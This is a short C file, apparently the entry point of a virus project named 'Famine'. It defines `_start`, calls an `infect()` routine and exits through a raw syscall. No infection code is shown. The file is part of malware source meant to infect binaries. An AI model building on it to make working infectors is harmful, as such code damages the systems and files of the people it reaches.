#include "famine.h"

int		_start(void)
{
	infect();
	syscall_exit(0);
	return (0);
}
